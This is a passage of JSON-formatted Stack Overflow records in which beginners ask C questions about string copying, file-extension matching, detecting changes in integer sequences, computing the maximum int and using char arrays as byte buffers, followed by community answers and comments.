in Case 1.\n\n#include&lt;stdio.h&gt;\nvoid xcopy(char *t,const char *s);\nint  main(int argc, char const *argv[])\n{\n  char name1[]=\"Asfakul\";\n  char *name;\n  char *target;\n  name=name1; // Here I dont have to allocate Memory (Case 1)\n  puts(name);\n\n  target=(char*)calloc(10,sizeof(char));  // Here I have to allocate Memory (Case 2)\n  xcopy(target,name);\n  return 0;\n}\n\n\nvoid xcopy(char *t,const char *s)\n{\n  while( *s !='\\0')\n  {\n    *t=*s;\n    t++;\n    s++;\n\n  }\n  puts(t);\n\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 14339, "user_id": 1466970, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/V1J6z.jpg?s=128&g=1", "display_name": "Richard Chambers", "link": "https://stackoverflow.com/users/1466970/richard-chambers"}, "edited": false, "score": 1, "creation_date": 1447248123, "post_id": 33651318, "comment_id": 55076112, "body": "do an insertion sort that has a check to see if (1) already a duplicate of a specific value and (2) has there been a duplicate yet. As long as the insertion sort is adding unique values, keep processing. Once a non-unique value is found, set a flag so that if another non-unique value is found, stop processing."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1447248171, "post_id": 33651318, "comment_id": 55076144, "body": "How do you &quot;take&quot; the input? Is it stored in an array? Is it read from keyboard or a file without storing it? Is the first value always the reference value?"}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447248173, "post_id": 33651318, "comment_id": 55076146, "body": "you get values from where? Still in array? reading them?"}, {"owner": {"reputation": 11, "user_id": 5550674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005483e91f2f2e10f10e187ff3866895?s=128&d=identicon&r=PG&f=1", "display_name": "Hasan Berkay Cagir", "link": "https://stackoverflow.com/users/5550674/hasan-berkay-cagir"}, "edited": false, "score": 0, "creation_date": 1447248280, "post_id": 33651318, "comment_id": 55076187, "body": "Values are being read from keyboard. There are no reference value sadly, if only that were the case."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447248419, "post_id": 33651318, "comment_id": 55076262, "body": "does order of data important in the target array?"}, {"owner": {"reputation": 11, "user_id": 5550674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005483e91f2f2e10f10e187ff3866895?s=128&d=identicon&r=PG&f=1", "display_name": "Hasan Berkay Cagir", "link": "https://stackoverflow.com/users/5550674/hasan-berkay-cagir"}, "edited": false, "score": 0, "creation_date": 1447248662, "post_id": 33651318, "comment_id": 55076414, "body": "No, it&#39;s not important."}, {"owner": {"reputation": 904, "user_id": 4004688, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1002512873/picture?type=large", "display_name": "Itay Sela", "link": "https://stackoverflow.com/users/4004688/itay-sela"}, "edited": false, "score": 0, "creation_date": 1447248671, "post_id": 33651318, "comment_id": 55076418, "body": "you could sort the array and check if first and second items are the same and if the last and one-before last are the same"}], "answers": [{"comments": [{"owner": {"reputation": 5171, "user_id": 2718186, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/ca44ca18bf615e74f930d28a89d01508?s=128&d=identicon&r=PG", "display_name": "MicroVirus", "link": "https://stackoverflow.com/users/2718186/microvirus"}, "edited": false, "score": 0, "creation_date": 1447249630, "post_id": 33651628, "comment_id": 55076987, "body": "I had written the original comparing characters, while it should have been integers as in your case. Fixed the code/text to compare integers."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447250835, "post_id": 33651628, "comment_id": 55077717, "body": "note that if array can be long it is possible to prevent re-checking all numbers by storing them (i.e. in statics variables) and just update stuff for new values. Of course it will need a &quot;re-initialisation&quot; command to restart with a new sequence of values."}, {"owner": {"reputation": 5171, "user_id": 2718186, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/ca44ca18bf615e74f930d28a89d01508?s=128&d=identicon&r=PG", "display_name": "MicroVirus", "link": "https://stackoverflow.com/users/2718186/microvirus"}, "reply_to_user": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447250947, "post_id": 33651628, "comment_id": 55077786, "body": "@hexasoft It would be fun to extend this to a module when such functionality is required."}], "tags": [], "owner": {"reputation": 5171, "user_id": 2718186, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/ca44ca18bf615e74f930d28a89d01508?s=128&d=identicon&r=PG", "display_name": "MicroVirus", "link": "https://stackoverflow.com/users/2718186/microvirus"}, "is_accepted": false, "score": 0, "last_activity_date": 1447249575, "last_edit_date": 1447249575, "creation_date": 1447248706, "answer_id": 33651628, "question_id": 33651318, "link": "https://stackoverflow.com/questions/33651318/detecting-changes-in-a-set-of-values/33651628#33651628", "title": "Detecting changes in a set of values", "body": "<p>The simplest algorithm I could come up with involves counting the number of times you see the two distinct values. Assuming <code>input</code> is an array with size <code>input_size</code>, this function returns <code>0</code> when the sequence is changed too much and <code>1</code> if one or zero changes are detected:</p>\n\n<pre><code>int isvalidsequence(const int *input, int input_size)\n{\n    int item1, item2;\n    int seen1 = 0, seen2 = 0;\n\n    for (int i = 0; i &lt; input_size; ++i)\n    {\n        int item = input[i];\n        if (seen1 == 0)\n        {\n            item1 = item;\n            ++seen1;\n        }\n        else if (item == item1)\n        {\n            ++seen1;\n        }\n        else if (seen2 == 0)\n        {\n            item2 = item;\n            ++seen2;\n        }\n        else if (item == item2)\n        {\n            ++seen2;\n        }\n        else\n        {\n            return 0;\n        }\n\n        /* Exit loop early if we've already seen both characters more than once */\n        if (seen1 &gt; 1 &amp;&amp; seen2 &gt; 1)\n            return 0;\n    }\n    return 1;\n}\n</code></pre>\n\n<p>It stores the first distinct item it sees and the second distinct item it sees and then starts counting how many times it sees each. If it then finds a third distinct item, then the sequence is changed too much. If it finds that both the first and the second distinct items have been seen more than once, then also the sequence has changed too much. Else, at least one of the two items has been seen 0 or 1 times, so the sequence is valid.</p>\n"}], "owner": {"reputation": 11, "user_id": 5550674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005483e91f2f2e10f10e187ff3866895?s=128&d=identicon&r=PG&f=1", "display_name": "Hasan Berkay Cagir", "link": "https://stackoverflow.com/users/5550674/hasan-berkay-cagir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1447249575, "creation_date": 1447247727, "last_edit_date": 1447248123, "question_id": 33651318, "link": "https://stackoverflow.com/questions/33651318/detecting-changes-in-a-set-of-values", "title": "Detecting changes in a set of values", "body": "<p>I have a project where a program takes numerous integer values and detects changes between these values. Only one different value from others are accepted, and only one time. When an error has been identified, like 10 12 13 ..., the program needs to stop rightaway, not getting the other values.</p>\n\n<pre><code>e.g: 10 10 10 10 10 18 10 10 10\n</code></pre>\n\n<p>This is an accepted data entry, as 18 is used only one time and is the only different value.</p>\n\n<pre><code>e.g: 10 10 14 17 10 10 10 10\n</code></pre>\n\n<p>This is not an accepted data entry, as 3 different values were used.</p>\n\n<pre><code>e.g: 10 10 10 10 12 12 12 12 12\n</code></pre>\n\n<p>This is also not an accepted data entry, as 10 and 12 used multiple times.</p>\n\n<p>I just couldn't create an algorithm for this, covering these 3 and probably more situations. Any idea(s)?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 1, "creation_date": 1447247668, "post_id": 33651242, "comment_id": 55075896, "body": "Have a look at this: <a href=\"http://www.gnu.org/software/libc/manual/html_node/Wildcard-Matching.html\" rel=\"nofollow noreferrer\">gnu.org/software/libc/manual/html_node/Wildcard-Matching.htm&zwnj;&#8203;l</a>"}, {"owner": {"reputation": 23, "user_id": 5550373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e28538cd7798d17c4ffc407a529ddd3?s=128&d=identicon&r=PG&f=1", "display_name": "beginner", "link": "https://stackoverflow.com/users/5550373/beginner"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1447249275, "post_id": 33651242, "comment_id": 55076780, "body": "I can&#39;t include the fnmatch.h file."}], "answers": [{"comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1447247689, "post_id": 33651304, "comment_id": 55075904, "body": "I&#39;d prefer to see const char* extension, and don&#39;t forget to check that filename is of sufficient length for len - 4 to be valid."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1447248163, "post_id": 33651304, "comment_id": 55076137, "body": "Methinks len &lt; 4 should result in the same behaviour as a non-zero strcmp."}], "tags": [], "owner": {"reputation": 5355, "user_id": 452079, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4fb85f91e35202c72ca16d54873b10c4?s=128&d=identicon&r=PG", "display_name": "rohit89", "link": "https://stackoverflow.com/users/452079/rohit89"}, "is_accepted": false, "score": 2, "last_activity_date": 1447247960, "last_edit_date": 1447247960, "creation_date": 1447247669, "answer_id": 33651304, "question_id": 33651242, "link": "https://stackoverflow.com/questions/33651242/comparing-strings-to-certain-pattern/33651304#33651304", "title": "comparing strings to certain pattern", "body": "<p>You could try this. </p>\n\n<pre><code>int len = strlen(filename);\nif (len &lt; 4) {\n   printf(\"Filename too short\\n\");\n   exit(1);\n}\nconst char *extension = &amp;filename[len-4];\nif strcmp(extension, \".txt\") == 0\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447248621, "post_id": 33651532, "comment_id": 55076383, "body": "Would upvote if you&#39;d showcase how to check this for success / match. Both <code>[]</code> and <code>%n</code> are not exactly everyday features of <code>*scanf()</code>, and potentially confusing for beginners. (<code>length &gt;= 4</code>?)"}, {"owner": {"reputation": 6048, "user_id": 492716, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6831c7dec9e7ca59c06a09135559ef62?s=128&d=identicon&r=PG", "display_name": "onemasse", "link": "https://stackoverflow.com/users/492716/onemasse"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447248857, "post_id": 33651532, "comment_id": 55076532, "body": "Actually I think you could skip %n and only check the return value of sscanf(), if it&#39;s not zero it&#39;ll match."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447249057, "post_id": 33651532, "comment_id": 55076653, "body": "Return code is &quot;the number of <i>input items</i> successfully matched <i>and assigned</i>&quot;. <code>%*[</code> suppresses assignment, <code>%n</code> is not an input item. Checked it, returns always zero, so <code>length &gt;= 4</code> is the correct check. (Actually, since <code>&quot;.txt&quot;</code> alone does <b>not</b> match -- <code>%[</code> matches 1..n, not 0..n -- any match gives <code>length &gt;= 5</code>.)"}, {"owner": {"reputation": 6048, "user_id": 492716, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6831c7dec9e7ca59c06a09135559ef62?s=128&d=identicon&r=PG", "display_name": "onemasse", "link": "https://stackoverflow.com/users/492716/onemasse"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447249207, "post_id": 33651532, "comment_id": 55076732, "body": "Ah, bummer. I guess then you need to actually read something."}], "tags": [], "owner": {"reputation": 6048, "user_id": 492716, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6831c7dec9e7ca59c06a09135559ef62?s=128&d=identicon&r=PG", "display_name": "onemasse", "link": "https://stackoverflow.com/users/492716/onemasse"}, "is_accepted": false, "score": 1, "last_activity_date": 1447249303, "last_edit_date": 1447249303, "creation_date": 1447248377, "answer_id": 33651532, "question_id": 33651242, "link": "https://stackoverflow.com/questions/33651242/comparing-strings-to-certain-pattern/33651532#33651532", "title": "comparing strings to certain pattern", "body": "<p>I would use <code>sscanf()</code>. Something like this:</p>\n\n<pre><code>int length = 0;\nsscanf( string, \"%*[^ \\n\\r\\t.].txt%n\", &amp;length );\nif ( length &gt;= 4 )\n{\n   do_something();\n}\n</code></pre>\n\n<p>The list of white space characters is probably not complete but will probably work for you.</p>\n"}, {"tags": [], "owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "is_accepted": true, "score": 2, "last_activity_date": 1447283696, "last_edit_date": 1495542597, "creation_date": 1447248970, "answer_id": 33651709, "question_id": 33651242, "link": "https://stackoverflow.com/questions/33651242/comparing-strings-to-certain-pattern/33651709#33651709", "title": "comparing strings to certain pattern", "body": "<p>You can search for the last occurrence of <code>.</code> with <a href=\"http://en.cppreference.com/w/c/string/byte/strrchr\" rel=\"nofollow noreferrer\"><code>strrchr</code></a>. If found, test against the <em>exact</em> string <code>.txt</code>:</p>\n\n<pre><code>ptr = strrchr (filename, '.');\nif (ptr &amp;&amp; strcmp(ptr, \".txt\") == 0) {\n    // do something\n</code></pre>\n\n<p>This won't even fail if the filename part of the full path does not contain an extension but the entire path does (then <code>strcmp</code> does not return <code>0</code>), or there is no full stop at all in the entire path (then <code>strrchr</code> returns <code>NULL</code>).</p>\n\n<p>I prefer this method over manually counting the length of the extension, because it will work without adjusting with any length for the file extension.</p>\n\n<p>Note that <code>strcmp</code> is strictly case sensitive. If your local library has either <code>stricmp</code> or <code>strcasecmp</code>, that may be a somewhat safer choice. (<code>stricmp</code> is Microsoft-only, <code>strcasecmp</code> is the more standard <a href=\"https://stackoverflow.com/q/5918697/2564301\">Posix equivalent</a>.)</p>\n"}, {"comments": [{"owner": {"reputation": 23, "user_id": 5550373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e28538cd7798d17c4ffc407a529ddd3?s=128&d=identicon&r=PG&f=1", "display_name": "beginner", "link": "https://stackoverflow.com/users/5550373/beginner"}, "edited": false, "score": 0, "creation_date": 1447249644, "post_id": 33651866, "comment_id": 55076997, "body": "How can I do that on windows? When I try including fnmatch.h I get an error."}, {"owner": {"reputation": 904, "user_id": 4004688, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1002512873/picture?type=large", "display_name": "Itay Sela", "link": "https://stackoverflow.com/users/4004688/itay-sela"}, "edited": false, "score": 0, "creation_date": 1447249677, "post_id": 33651866, "comment_id": 55077016, "body": "take a look at this SO question <a href=\"http://stackoverflow.com/questions/2364302/fnmatch-for-windows-in-c\" title=\"fnmatch for windows in c\">stackoverflow.com/questions/2364302/fnmatch-for-windows-in-c</a>"}], "tags": [], "owner": {"reputation": 904, "user_id": 4004688, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1002512873/picture?type=large", "display_name": "Itay Sela", "link": "https://stackoverflow.com/users/4004688/itay-sela"}, "is_accepted": false, "score": 0, "last_activity_date": 1447249521, "last_edit_date": 1447249521, "creation_date": 1447249457, "answer_id": 33651866, "question_id": 33651242, "link": "https://stackoverflow.com/questions/33651242/comparing-strings-to-certain-pattern/33651866#33651866", "title": "comparing strings to certain pattern", "body": "<p>There's a function exactly for what you're asking for with no tricks.\nit's called <code>fnmatch</code>.</p>\n\n<p>an example for usage:</p>\n\n<pre><code>int check_if_text( char *file_name ) \n{\n    char *file_pattern = \"*.txt\";\n\n    if ( fnmatch( file_pattern, file_name, 0 ) == 0 ) {\n        return EXIT_SUCCESS;\n    }\n    return EXIT_FAILURE;\n}\n</code></pre>\n\n<p>to use this function you will need to <code>#include &lt;fnmatch.h&gt;</code></p>\n"}], "owner": {"reputation": 23, "user_id": 5550373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e28538cd7798d17c4ffc407a529ddd3?s=128&d=identicon&r=PG&f=1", "display_name": "beginner", "link": "https://stackoverflow.com/users/5550373/beginner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 565, "favorite_count": 0, "accepted_answer_id": 33651709, "answer_count": 4, "score": 2, "last_activity_date": 1447283696, "creation_date": 1447247448, "question_id": 33651242, "link": "https://stackoverflow.com/questions/33651242/comparing-strings-to-certain-pattern", "title": "comparing strings to certain pattern", "body": "<h2>#1</h2>\n\n<p>How can I check if the file is of a certain type?</p>\n\n<p>I was trying to do it like this:</p>\n\n<pre><code>if(strcmp(filename, \"*.txt\") == 0){\n    // do something\n{\n</code></pre>\n\n<p>But unfortunately this doesn't work.</p>\n\n<hr>\n\n<h2>#2</h2>\n\n<p>I know that I can not use the <strong>*</strong> in strcmp.\nSo how can I compare my string to a specific pattern?</p>\n\n<p>For example:</p>\n\n<pre><code>if filename is ***.***.txt\ndo something\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1447246249, "post_id": 33650790, "comment_id": 55075142, "body": "You <i>do</i> know that integer overflow is undefined, right?"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1447246410, "post_id": 33650790, "comment_id": 55075233, "body": "Well, have a look at the C standard. C11 draft standard n1570 (openly available on the web): <code>6.5 Expressions, Section 5 If an exceptional condition occurs during the evaluation of an expression (that is, if the result is not mathematically defined or not in the range of representable values for its type), the behavior is undefined.</code>"}, {"owner": {"reputation": 4245, "user_id": 3613657, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/16dbb100614d9c85c0a1689ef29f5f43?s=128&d=identicon&r=PG&f=1", "display_name": "Mathieu Border&#233;", "link": "https://stackoverflow.com/users/3613657/mathieu-border%c3%a9"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447246581, "post_id": 33650790, "comment_id": 55075330, "body": "allright, thanks a lot"}], "answers": [{"tags": [], "owner": {"reputation": 9554, "user_id": 3306465, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/MAduK.png?s=128&g=1", "display_name": "Igal S.", "link": "https://stackoverflow.com/users/3306465/igal-s"}, "is_accepted": true, "score": 6, "last_activity_date": 1447245935, "creation_date": 1447245935, "answer_id": 33650836, "question_id": 33650790, "link": "https://stackoverflow.com/questions/33650790/function-to-calculate-max-value-of-int-not-returning-desired-result/33650836#33650836", "title": "Function to calculate max value of int not returning desired result", "body": "<p>It is a recursion. You need to return the value of it.</p>\n\n<p>So in the last line it should be:</p>\n\n<pre><code>return max_int_helper(prev_i);\n</code></pre>\n"}], "owner": {"reputation": 4245, "user_id": 3613657, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/16dbb100614d9c85c0a1689ef29f5f43?s=128&d=identicon&r=PG&f=1", "display_name": "Mathieu Border&#233;", "link": "https://stackoverflow.com/users/3613657/mathieu-border%c3%a9"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "accepted_answer_id": 33650836, "answer_count": 1, "score": 0, "last_activity_date": 1447245935, "creation_date": 1447245769, "last_edit_date": 1447245817, "question_id": 33650790, "link": "https://stackoverflow.com/questions/33650790/function-to-calculate-max-value-of-int-not-returning-desired-result", "title": "Function to calculate max value of int not returning desired result", "body": "<p>I'm just starting out learning C. I'm trying to find the max value of an int by calculation (actually I'm trying to find the max value of a float through the same method, but I want to test it on int first).\nThe logic seems to be OK, but my function always returns 0 at the end.</p>\n\n<pre><code>int max_int_helper(int base) \n{\n  int prev_i, next_i, counter;\n  counter = 1;\n  prev_i = next_i = base + counter;\n\n  // found max\n  if (next_i &lt; base) {\n    printf(\"WE RETURN BASE %d\\n\", base);\n    return base;\n  } else {   \n      while(prev_i &lt;= next_i) \n      {\n        prev_i = next_i;\n        counter *= 2;\n        next_i = base + counter;\n      }\n        max_int_helper(prev_i);\n  }\n}\n</code></pre>\n\n<p>I call it in my main function like this</p>\n\n<pre><code>printf(\"max int calculated: %d\", max_int_helper(0));\n</code></pre>\n\n<p>But when I run the thing I get this:</p>\n\n<p>WE RETURN BASE 2147483647\nmax int calculated: 0</p>\n\n<p>I explicitly put the printf statement, so that I'm \"sure\" I only return once and the value is correct.</p>\n\n<p>Please point me out where it's going wrong.</p>\n"}, {"tags": ["c", "char"], "comments": [{"owner": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "edited": false, "score": 1, "creation_date": 1447245961, "post_id": 33650755, "comment_id": 55075019, "body": "I think as long as you never use string functions (<code>strcpy</code>, <code>strcat</code>, etc) should be no problem"}, {"owner": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "edited": false, "score": 1, "creation_date": 1447246081, "post_id": 33650755, "comment_id": 55075067, "body": "i think your main problem is going to be to do with things like <code>tmp[i] == 250</code>. if tmp is a char, then it&#39;s undefined whether or not it&#39;s signed or unsigned. if it&#39;s signed, then that statement can never be true as it has to be between -128 and 127"}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "reply_to_user": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "edited": false, "score": 0, "creation_date": 1447246115, "post_id": 33650755, "comment_id": 55075083, "body": "@TomTanner It is given that the char is always unsigned."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1447246267, "post_id": 33650755, "comment_id": 55075153, "body": "It&#39;s ok. I&#39;d possibly use <code>signed char</code> or <code>unsigned char</code> rather than <code>char</code> as a notice that it isn&#39;t supposed to be treated as a string."}], "answers": [{"comments": [{"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447246031, "post_id": 33650840, "comment_id": 55075043, "body": "I don&#39;t decide what the array is. Its expected to be a char array by the manufacturer function that I use to retrieve the data. Im unsure wether or not converting it to another type would do harm in that."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447246169, "post_id": 33650840, "comment_id": 55075109, "body": "@Magisch There&#39;s no harm keeping it as a <code>char</code> array, as long as you are aware of the limitation (no string functions) and also document it for future readers/users of the code."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447246608, "post_id": 33650840, "comment_id": 55075341, "body": "Alright then. Thank you for your assertion. (My coworkers usually also defer to SO as means of guidance so linking them to this will help)"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 7, "last_activity_date": 1447245950, "creation_date": 1447245950, "answer_id": 33650840, "question_id": 33650755, "link": "https://stackoverflow.com/questions/33650755/safety-of-using-0-before-the-end-of-character-arrays/33650840#33650840", "title": "Safety of using \\0 before the end of character arrays", "body": "<p>Using an array of <code>char</code> as an array of small integers is perfectly fine. Just be careful not to pass it to any kind of function that expects \"strings\".</p>\n\n<p>And if you want to be more explicit about it, and also make sure that the array is using <code>unsigned char</code> you could use <a href=\"http://en.cppreference.com/w/c/types/integer\"><code>uint8_t</code></a> instead.</p>\n"}], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "accepted_answer_id": 33650840, "answer_count": 1, "score": 5, "last_activity_date": 1447245950, "creation_date": 1447245636, "last_edit_date": 1447245858, "question_id": 33650755, "link": "https://stackoverflow.com/questions/33650755/safety-of-using-0-before-the-end-of-character-arrays", "title": "Safety of using \\0 before the end of character arrays", "body": "<p>I am writing a driver for an embedded system that runs a custom version of modified linux (Its a handscanner). The manufacturer supplys a custom Eclipse Juno distribution with a few libraries and examples inbound. </p>\n\n<p>The output I receive from the comport comes in form of a standard character array. I 